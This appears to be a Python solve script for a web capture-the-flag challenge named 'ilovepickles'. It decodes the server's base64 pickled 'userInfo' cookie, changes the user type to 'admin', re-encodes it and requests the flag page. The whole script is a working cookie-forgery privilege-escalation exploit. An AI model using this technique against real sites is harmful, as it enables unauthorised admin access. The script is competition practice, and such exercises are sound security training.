#!/bin/env python3

import requests
import logging
import os
import pickle
import base64
import re
logging.disable()


class User:
    pass


# Se challenge web
URL = os.environ.get("URL", "http://ilovepickles.challs.srdnlen.it")
session = requests.session()
r = session.get(URL)
user = r.cookies.get_dict()['userInfo']
user = pickle.loads(base64.b64decode(user))
user.user_type = "admin"
user = base64.b64encode(pickle.dumps(user))
user = user.decode("utf-8")

session.cookies.set('userInfo', None)
session.cookies.set('userInfo', user)

r = session.get(URL+"/flag")

flag = re.search("srdnlen{(.*)}", r.text).group(0)

print(flag)
